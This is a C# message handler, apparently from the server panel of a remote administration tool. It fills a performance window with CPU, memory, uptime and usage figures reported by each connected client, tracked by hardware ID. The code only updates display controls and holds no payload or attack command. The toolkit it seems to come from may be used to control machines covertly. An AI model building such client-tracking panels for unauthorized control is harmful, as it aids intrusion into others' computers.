using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerPerformance
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		string a = (string)objects[1];
		if (!(a == "Connect"))
		{
			if (!(a == "Response"))
			{
				return;
			}
			FormPerformance form = (FormPerformance)client.Tag;
			if (form == null)
			{
				client.Disconnect();
				return;
			}
			form.Invoke((MethodInvoker)delegate
			{
				form.label3.Text = "System Time: " + (int)objects[2] / 60 + " Minutes";
				form.circularProgressBar2.Text = (int)objects[3] + " %";
				form.circularProgressBar2.Value = (int)objects[3];
				form.circularProgressBar1.Text = (int)objects[4] + " %";
				form.circularProgressBar1.Value = (int)objects[4];
			});
			return;
		}
		FormPerformance form2 = (FormPerformance)Application.OpenForms["Performance:" + (string)objects[2]];
		if (form2 == null)
		{
			client.Disconnect();
			return;
		}
		form2.Invoke((MethodInvoker)delegate
		{
			form2.Text = "Performance [" + (string)objects[2] + "]";
			form2.client = client;
			form2.label1.Text += (string)objects[3];
			Label label = form2.label4;
			label.Text = label.Text + (string)objects[4] + " Mhz";
			form2.label6.Text += (string)objects[5];
			form2.label7.Text += (string)objects[6];
			form2.label2.Text += (string)objects[7];
			Label label2 = form2.label5;
			label2.Text = label2.Text + (string)objects[8] + " Mhz";
			form2.label3.Text = "System Time: " + (int)objects[9] / 60 + " Minutes";
			form2.circularProgressBar2.Text = (int)objects[10] + " %";
			form2.circularProgressBar2.Value = (int)objects[10];
			form2.circularProgressBar1.Text = (int)objects[11] + " %";
			form2.circularProgressBar1.Value = (int)objects[11];
		});
		client.Tag = form2;
		client.Hwid = (string)objects[2];
	}
}
